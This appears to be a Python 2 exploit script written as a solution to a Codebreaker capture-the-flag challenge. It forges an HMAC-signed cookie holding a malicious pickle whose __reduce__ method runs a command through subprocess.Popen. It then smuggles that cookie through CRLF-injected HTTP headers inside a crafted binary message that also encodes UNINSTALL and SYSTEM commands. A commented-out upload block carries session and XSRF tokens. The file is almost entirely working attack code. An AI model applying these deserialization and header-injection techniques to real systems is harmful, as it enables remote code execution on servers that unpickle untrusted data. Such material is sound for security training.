import struct, zlib, sys

import pickle, base64, hmac
import subprocess

def _lscmp(a, b):
    """ Compares two strings in a cryptographically safe way:
    Runtime is not affected by length of common prefix. """
    return not sum(((0 if x == y else 1) for x, y in zip(a, b))) and len(a) == len(b)

def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return bytes(s)

def cookie_is_encoded(data):
    """ Return True if the argument looks like a encoded cookie."""
    return bool(data.startswith(tob('!')) and tob('?') in data)

def cookie_decode(data, key):
    """ Verify and decode an encoded string. Return an object or None."""
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg).digest())):
            print msg
            return pickle.loads(base64.b64decode(msg))

class RunBinSh(object):
  def __reduce__(self):
    # print '123123'
    return (subprocess.Popen, (('/usr/bin/id',),))

cookie = base64.b64encode(pickle.dumps(RunBinSh()))
key = '40BA53860DB36E2A64529F5F769D9140'
sig = base64.b64encode(hmac.new(tob(key), tob(cookie)).digest())
data = b'!' + sig + b'?' + tob(cookie)
# cookie_decode(data, key)

b32 = lambda x: struct.pack('>I', x)
KILL = 7
ENABLE = 6
SYSTEM = 1
DISABLE = 5
UNINSTALL = 2

title = 'MODULE/sys_1ccd0d12/'
topic = 'nodes-479b5b2b\x00'
title += topic

body = ''

def generate_bins(strings):
    ret = ''
    ret += chr(0x90 + len(strings))
    for s in strings:
        ret += chr(0xc6)
        ret += b32(len(s))
        ret += s
    return ret

def generate_bin(s):
    ret = chr(0xc6)
    ret += b32(len(s))
    ret += s
    return ret

def generate_int(x):
    ret = ''
    ret += chr(0xd2)
    ret += b32(x)
    return ret

def generate_system(s):
    return generate_bins([generate_int(SYSTEM), generate_bin(s)])

'''
POST /upload/AAAA HTTP/1.0\r\nConnection: close\r\nAccept: */*\r\nContent-Type: application/octet-stream\r\nContent-Length: 8
'''

topic1 = 'nodes-0017f8f3\x00'

# outer
import urllib
# disable_cmd = title1 + generate_bins([topic1, generate_bins([generate_int(DISABLE), ''])])
# p = generate_bins([topic1, generate_bin('')])
p = generate_bins([topic1, generate_bins([generate_int(UNINSTALL), ''])])
# p = '123'

# f = '\xff\xff\xee\xee'
# body = 'new=' + p
# print body
body = '123'
# payload = 'POST /new HTTP/1.0\r\nX-Client-Id: ' + clientid + '\r\nFrom: '
# uid = '1' * 32 + ' HTTP/1.0\r\nContent-Encoding: gzip\r\nConnection: Keep-Alive\r\nAccept: */*\r\nContent-Type: application/octet-stream\r\nContent-Length: 81920\r\n\r\n'
# uid += 'A' * 81920
uid = '3' * 32 + ' HTTP/1.0\r\nCookie: return_log=' + data + '\r\nFrom: '

f = open('b', 'wb')
f.write(title + uid + '\x00' + body)
f.close()

'''
import requests
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}
cookie = {
        'XSRF-TOKEN': 'eyJpdiI6IlNraU54aWxVcmUrNHdma3dYSFwvOXZRPT0iLCJ2YWx1ZSI6InNOc0xDYzh0NGRsR1NLWDJYZWtpS0ZmelAxOXBJR2g1U1BJanRyaktZQVwvVERiZ3krbCtpUHBwVkIxYmNudVwvWVBwK1QzZ2FOcFZIWlhZTXYzblwveDNnPT0iLCJtYWMiOiI3OGUyZmM3YjM1NGY1MmU2NTUyNGIxOTQzOWZjYzMyYWEzNWVkODE4NzZlZTM1MmM3NDM4NTNmNWMxMDgwYjNiIn0%3D',
        'laravel_session': 'eyJpdiI6ImhEU3VmTGViYnd0YXNsVlBcL0hKS0pBPT0iLCJ2YWx1ZSI6IktWRUNyOW9xWFhhTitZUFh4b3ZuMmk3RmJLRndSbU1hYVVHMFN3bENTb0tXbXZnSEVXNDRDRGZzWlRBVTZjOVVkVlZReDhXUElNYlNTeGFmaGV0bFhBPT0iLCJtYWMiOiI5YjMzYWEzYzJlMjBlYjJlZGRhYTg3N2NiMTFiODA2MmI2YzJiYzY0MmViYmQzOTNkMGUyN2MzYWI2ODIwNjkzIn0%3D'
}
files = {'tier_6_solution': open('b', 'rb')}
values = {'_token': 'y4750ekRheMLSfT0sWvxxg6jLHVmQEXwaEWsfurF', 'submit': '1'}
r = requests.post('https://codebreaker.ltsnet.net/challenge', files=files, data=values, cookies=cookie, headers=headers)
print r.text
'''

# f = open('b', 'ab')
# f.write(body)
# f.close()



